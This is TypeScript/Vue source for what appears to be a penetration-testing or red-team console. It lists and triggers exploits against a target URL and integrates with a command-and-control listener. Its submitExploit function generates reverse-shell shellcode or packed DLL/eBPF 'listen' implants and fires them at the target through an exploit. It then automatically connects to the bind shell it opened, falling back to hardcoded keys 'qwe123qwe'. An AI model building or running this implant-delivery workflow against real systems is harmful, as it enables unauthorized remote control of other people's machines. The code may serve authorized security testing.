    exploitOptionValues.value[option.key] = ''
  }

  showDialog.value = true
}

function openVulnExploit(vuln: VulnerabilityGroup) {
  if (!currentTarget.value) {
    ElMessage.warning('No target selected')
    return
  }

  const exploit = resolveExploitForVulnerability(vuln)
  openExploitDialog(exploit, vuln.exploit_target || vuln.target || currentTarget.value.url)
}

function goBack() {
  router.push(`/projects/${projectId.value}`)
}

async function loadTarget() {
  try {
    const targets = await getProjectTargets(projectId.value)
    currentTarget.value = targets.find(t => t.id === targetId.value) || null

    if (currentTarget.value) {
      targetName.value = currentTarget.value.name
      targetUrl.value = currentTarget.value.url
      vshellEnabled.value = currentTarget.value.vshell_config?.enabled || false
      vshellListenerId.value = currentTarget.value.vshell_config?.listener_id || ''
      vshellHost.value = currentTarget.value.vshell_config?.host || ''
      vshellPort.value = currentTarget.value.vshell_config?.port
    }
  } catch (e: any) {
    ElMessage.error(`Failed to load target: ${e.message}`)
  }
}

async function loadListeners() {
  try {
    listeners.value = await listListeners()
  } catch (e: any) {
    ElMessage.warning(`Failed to load listeners: ${e.message}`)
  }
}

function onVShellEnabledChange() {
  if (vshellEnabled.value) {
    loadListeners()
  }
}

async function addNewListener() {
  if (!newListenerName.value.trim()) {
    ElMessage.warning('Please enter listener name')
    return
  }
  if (!newListenerHost.value.trim()) {
    ElMessage.warning('Please enter local address')
    return
  }

  addingListener.value = true
  try {
    const listener = await addListener({
      name: newListenerName.value,
      host: newListenerHost.value.trim(),
      connect_host: newListenerConnectHost.value.trim() || undefined,
      port: newListenerPort.value,
      protocol: newListenerProtocol.value,
      listener_type: 'listen'
    })

    ElMessage.success(`Listener "${listener.name || newListenerName.value}" added successfully`)

    await loadListeners()
    const matched = listeners.value.find(item =>
      item.name === newListenerName.value &&
      item.port === newListenerPort.value &&
      item.host === newListenerHost.value.trim()
    )
    vshellListenerId.value = listener.id || matched?.id || ''

    newListenerName.value = ''
    newListenerHost.value = '0.0.0.0'
    newListenerConnectHost.value = '127.0.0.1'
    newListenerPort.value = 8088
    newListenerProtocol.value = 'tcp'
    showAddListenerDialog.value = false
  } catch (e: any) {
    ElMessage.error(`Failed to add listener: ${e.message}`)
  } finally {
    addingListener.value = false
  }
}

async function saveTargetSettings() {
  if (!currentTarget.value) return

  savingSettings.value = true
  try {
    const vshell_config = vshellEnabled.value
      ? {
          enabled: true,
          listener_id: vshellListenerId.value || undefined,
          host: vshellHost.value || undefined,
          port: vshellPort.value || undefined,
        }
      : { enabled: false }

    await updateTarget(
      projectId.value,
      targetId.value,
      targetName.value,
      targetUrl.value,
      vshell_config
    )

    ElMessage.success('Target settings saved')
    await loadTarget()
  } catch (e: any) {
    ElMessage.error(`Failed to save settings: ${e.message}`)
  } finally {
    savingSettings.value = false
  }
}

async function restoreLatestScan() {
  if (!currentTarget.value) {
    scanResult.value = null
    assetStore.clear()
    return
  }

  try {
    const latestRun = await fetchLatestTargetRun(projectId.value, targetId.value)
    if (!latestRun) {
      scanResult.value = null
      assetStore.clear()
      return
    }

    scanResult.value = {
      run_id: latestRun.id,
      run: latestRun,
    }
    await assetStore.load(latestRun.id)
    await loadOutputFiles()
  } catch (e: any) {
    ElMessage.warning(`Failed to restore latest scan: ${e.message}`)
  }
}

async function startScan() {
  if (!currentTarget.value) return

  scanning.value = true
  try {
    const result = await startScanAPI({
      target: currentTarget.value.url,
      project_id: projectId.value,
      target_id: targetId.value,
    })
    scanResult.value = result
    await assetStore.load(result.run_id)
    await loadOutputFiles()
    ElMessage.success('Scan started')
  } catch (e: any) {
    ElMessage.error(`Scan failed: ${e.message}`)
  } finally {
    scanning.value = false
  }
}

async function loadAssets() {
  if (!scanResult.value?.run_id) {
    ElMessage.warning('No scan results available')
    return
  }
  await assetStore.load(scanResult.value.run_id)
}

async function loadOutputFiles() {
  if (!scanResult.value?.run_id) {
    ElMessage.warning('No scan results available')
    return
  }

  loadingFiles.value = true
  try {
    const result = await fetchOutputFiles(scanResult.value.run_id)
    outputFiles.value = result.files || []
  } catch (e: any) {
    ElMessage.error(`Failed to load output files: ${e.message}`)
  } finally {
    loadingFiles.value = false
  }
}

async function viewFile(file: any) {
  if (!scanResult.value?.run_id) return

  try {
    const result = await fetchOutputFileContent(scanResult.value.run_id, file.name)
    selectedFileName.value = file.name

    if (result.lines && result.lines.length > 0) {
      // JSONL file - parse each line as JSON
      fileEntries.value = result.lines.map((line: string) => {
        try {
          return JSON.parse(line)
        } catch {
          return { raw: line }
        }
      })
      fileContent.value = ''
    } else {
      // Regular text file
      fileContent.value = result.content || ''
      fileEntries.value = null
    }
  } catch (e: any) {
    ElMessage.error(`Failed to load file: ${e.message}`)
  }
}

function clearFileView() {
  selectedFileName.value = ''
  fileContent.value = ''
  fileEntries.value = null
}

function formatFileSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`
}

async function loadExploits() {
  try {
    exploits.value = await listExploits()
  } catch (e: any) {
    ElMessage.warning(`Could not load exploits: ${e.message}`)
  }
}

function severityTag(severity: string) {
  const map: Record<string, string> = {
    critical: 'danger',
    high: 'danger',
    medium: 'warning',
    low: 'info',
  }
  return map[severity.toLowerCase()] || 'info'
}

function hitLabel(hit: VulnerabilityHit): string {
  return hit.path === '/' ? '/' : hit.path
}

async function checkExploit(exploit: ExploitInfo) {
  if (!currentTarget.value) {
    ElMessage.warning('No target selected')
    return
  }

  try {
    const result = await triggerExploit({
      target: currentTarget.value.url,
      exploit_id: exploit.id,
      mode: 'check',
      project_id: projectId.value,
      target_id: targetId.value,
    })

    if (result.result?.vulnerable) {
      ElMessageBox.alert(
        result.result.detail || 'Target is vulnerable',
        'Vulnerability Confirmed',
        {
          confirmButtonText: 'OK',
          type: 'success',
          customClass: 'exploit-result-dialog',
        }
      )
    } else {
      ElMessageBox.alert(
        result.result?.detail || 'Check completed - not vulnerable',
        'Check Result',
        {
          confirmButtonText: 'OK',
          type: 'info',
          customClass: 'exploit-result-dialog',
        }
      )
    }
  } catch (e: any) {
    ElMessage.error(`Check failed: ${e.message}`)
  }
}

function runExploit(exploit: ExploitInfo) {
  if (!currentTarget.value) {
    ElMessage.warning('No target selected')
    return
  }

  openExploitDialog(exploit, currentTarget.value.url)
}

function filterExploitOptions(exploit: ExploitInfo, mode: ExploitMode): ExploitOption[] {
  return (exploit.options || []).filter(option => {
    const modes = option.modes?.length ? option.modes : ['execute']
    return modes.includes(mode)
  })
}

function buildPayloadOptions(): Record<string, string> {
  const options: Record<string, string> = {}
  Object.entries(exploitOptionValues.value).forEach(([key, value]) => {
    const trimmed = value.trim()
    if (trimmed) {
      options[key] = trimmed
    }
  })
  return options
}

async function submitExploit() {
  if (!selectedExploit.value) {
    return
  }
  if (!exploitTarget.value.trim()) {
    ElMessage.warning('Please enter a target')
    return
  }

  const options = buildPayloadOptions()
  for (const option of selectedExploitOptions.value) {
    if (option.required && !String(options[option.key] || '').trim()) {
      ElMessage.warning(`Please enter ${option.label}`)
      return
    }
  }

  executing.value = true
  try {
    // Generate shellcode if VShell is enabled
    if (useVShellShellcode.value && vshellListenerId.value) {
      try {
        if (vshellConnectionMode.value === 'reverse') {
          // Reverse shell mode: target connects back to listener
          const shellcodeBlob = await generateShellcode({
            listener_id: vshellListenerId.value,
            client_type: shellcodeClientType.value,
            arch: shellcodeArch.value,
          })

          // Convert blob to base64
          const arrayBuffer = await shellcodeBlob.arrayBuffer()
          const bytes = new Uint8Array(arrayBuffer)
          let binary = ''
          const chunkSize = 8192
          for (let i = 0; i < bytes.length; i += chunkSize) {
            binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize))
          }
          const base64 = btoa(binary)

          // Add shellcode to options
          options.shellcode = base64
          options.shellcode_type = shellcodeClientType.value
          options.shellcode_arch = shellcodeArch.value

          ElMessage.success(`Generated ${shellcodeClientType.value} shellcode (${bytes.length} bytes)`)
        } else {
          // Listen mode: target opens a port for attacker to connect
          let listenPayloadBlob: Blob
          let payloadTypeLabel = ''

          if (listenModeType.value === 'dll_listen') {
            // DLL Listen mode: generate DLL with listen=true
            listenPayloadBlob = await generateShellcode({
              listener_id: vshellListenerId.value,
              client_type: 'dll',
              arch: 'loader',
              listen: true,
              tp: listenModeProtocol.value,
              host: '0.0.0.0',
              port: listenModeTargetPort.value,
              vkey: listenModeVKey.value,
              salt: listenModeSalt.value,
            })
            payloadTypeLabel = 'DLL listen'
          } else if (listenModeType.value === 'ebpf_listen') {
            // eBPF Listen mode: generate listen payload with ebpf=true
            listenPayloadBlob = await downloadListenPayload({
              arch: shellcodeArch.value.replace('.bin', ''),
              port: listenModeTargetPort.value,
              tp: listenModeProtocol.value,
              host: '0.0.0.0',
              vkey: listenModeVKey.value,
              salt: listenModeSalt.value,
              upx: true,
              ebpf: true,
            })
            payloadTypeLabel = 'eBPF listen'
          } else {
            // Standard Listen mode
            listenPayloadBlob = await downloadListenPayload({
              arch: shellcodeArch.value.replace('.bin', ''),
              port: listenModeTargetPort.value,
              tp: listenModeProtocol.value,
              host: '0.0.0.0',
              vkey: listenModeVKey.value,
              salt: listenModeSalt.value,
              upx: true,
            })
            payloadTypeLabel = 'standard listen'
          }

          // Convert blob to base64
          const arrayBuffer = await listenPayloadBlob.arrayBuffer()
          const bytes = new Uint8Array(arrayBuffer)
          let binary = ''
          const chunkSize = 8192
          for (let i = 0; i < bytes.length; i += chunkSize) {
            binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize))
          }
          const base64 = btoa(binary)

          // Add payload to options
          options.shellcode = base64
          options.shellcode_type = listenModeType.value
          options.shellcode_arch = shellcodeArch.value
          options.listen_port = listenModeTargetPort.value.toString()
          options.listen_protocol = listenModeProtocol.value
          if (listenModeVKey.value) options.listen_vkey = listenModeVKey.value
          if (listenModeSalt.value) options.listen_salt = listenModeSalt.value

          ElMessage.success(`Generated ${payloadTypeLabel} payload (${bytes.length} bytes) - target will open ${listenModeProtocol.value}:${listenModeTargetPort.value}`)
        }
      } catch (e: any) {
        ElMessage.error(`Failed to generate shellcode: ${e.message}`)
        executing.value = false
        return
      }
    }

    const result = await triggerExploit({
      target: exploitTarget.value.trim(),
      exploit_id: selectedExploit.value.id,
      mode: 'execute',
      command: showCommandInput.value ? (exploitCommand.value.trim() || selectedExploit.value.default_command || 'id') : undefined,
      options: Object.keys(options).length > 0 ? options : undefined,
      leak_path: options.leak_path || undefined,
      project_id: projectId.value,
      target_id: targetId.value,
    })
    exploitResult.value = result
    exploitResultMode.value = 'execute'
    showDialog.value = false
    ElMessage.success('Exploit executed')

    // If listen mode and exploit succeeded, automatically connect to the bind shell
    if (vshellConnectionMode.value === 'listen' && useVShellShellcode.value && result?.status === 'success') {
      try {
        // Extract IP from target URL
        const targetUrl = new URL(exploitTarget.value.trim())
        const targetIp = targetUrl.hostname

        ElMessage.info(`Connecting to bind shell at ${targetIp}:${listenModeTargetPort.value}...`)

        const { addClient } = await import('@/api/vshell')
        const connectResult = await addClient({
          ip: targetIp,
          port: listenModeTargetPort.value,
          tp: listenModeProtocol.value,
          vkey: listenModeVKey.value || 'qwe123qwe',
          salt: listenModeSalt.value || 'qwe123qwe',
          ebpf: listenModeType.value === 'ebpf_listen',
        })

        if (connectResult.success) {
          ElMessage.success(`Connected to bind shell at ${targetIp}:${listenModeTargetPort.value}`)
        } else {
          ElMessage.warning(`Failed to connect: ${connectResult.error || 'Unknown error'}`)
        }
      } catch (e: any) {
        ElMessage.warning(`Failed to connect to bind shell: ${e.message}`)
      }
    }
  } catch (e: any) {
    ElMessage.error(`Exploit failed: ${e.message}`)
  } finally {
    executing.value = false
  }
}

function formatValue(value: unknown) {
  if (value === undefined || value === null || value === '') return '-'
  if (typeof value === 'boolean') return value ? 'true' : 'false'
  return String(value)
}

function formatConfidence(value: unknown) {
  if (typeof value !== 'number') return '-'
  return value.toFixed(2)
}

function resultTagType(status: string) {
  if (status === 'succeeded' || status === 'success') return 'success'
  if (status === 'failed' || status === 'error') return 'danger'
  if (status === 'running' || status === 'accepted') return 'warning'
  return 'info'
}

onMounted(async () => {
  await loadTarget()
  await restoreLatestScan()
  await loadExploits()
})
</script>

<style scoped>
.target-workspace {
  padding: 20px;
}

.workspace-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}

.header-left {
  display: flex;
  align-items: center;
  gap: 15px;
}

.header-left h1 {
  color: #e5e5e5;
  margin: 0;
}

.workspace-tabs {
  margin-top: 20px;
}

.workspace-card {
  margin-bottom: 20px;
}

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.stat-cards {
  margin-top: 20px;
}

.stat-card {
  padding: 20px;
  background: #1a1a1a;
  border: 1px solid #303030;
  border-radius: 8px;
  text-align: center;
  transition: all 0.3s;
}

.stat-card:hover {
  border-color: #409eff;
  transform: translateY(-2px);
}

.stat-number {
  font-size: 36px;
  font-weight: bold;
  color: #409eff;
  text-align: center;
  margin-bottom: 8px;
}

.stat-number.has-vulns {
  color: #f56c6c;
}

.stat-label {
  font-size: 13px;
  color: #909399;
  text-align: center;
}

.host-title {
  display: flex;
  align-items: center;
  gap: 12px;
  width: 100%;
}

.host-domain {
  color: #909399;
  font-size: 13px;
}

.host-badges {
  margin-left: auto;
  display: flex;
  align-items: center;
  gap: 8px;
}

.badge-label {
  font-size: 12px;
  color: #909399;
  margin-right: 12px;
}

.vuln-tags {
  display: flex;
  gap: 4px;
  flex-wrap: wrap;
}

.vuln-group-expand {
  padding: 8px 12px;
}

.vuln-group-expand-title {
  margin-bottom: 8px;
  color: #c0c4cc;
  font-size: 12px;
}

.vuln-hit-list {
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.vuln-hit-item {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
}

.vuln-hit-target {
  color: #909399;
  font-size: 12px;
  word-break: break-all;
}

.empty-hint {
  text-align: center;
  padding: 40px;
  color: #909399;
}

.result-card {
  margin-top: 20px;
}

.result-section {
  margin-top: 16px;
}

.result-section-title {
  color: #c0c4cc;
  font-size: 13px;
  font-weight: 600;
  margin-bottom: 8px;
}

.option-hint {
  margin-top: 6px;
  color: #909399;
  font-size: 12px;
  line-height: 1.4;
}

.result-output {
  background: #0d0d0d;
  color: #67c23a;
  padding: 16px;
  border-radius: 4px;
  font-family: monospace;
  font-size: 13px;
  max-height: 400px;
  overflow: auto;
  white-space: pre-wrap;
  word-break: break-word;
}

:deep(.exploit-result-dialog) {
  max-width: 800px;
}

:deep(.exploit-result-dialog .el-message-box__message) {
  max-height: 500px;
  overflow-y: auto;
  white-space: pre-wrap;
  word-break: break-word;
  font-family: 'Courier New', monospace;
  background: #0d0d0d;
  color: #67c23a;
  padding: 16px;
  border-radius: 4px;
  font-size: 13px;
}

.field-hint {
  font-size: 12px;
  color: #909399;
  margin-top: 4px;
}
</style>
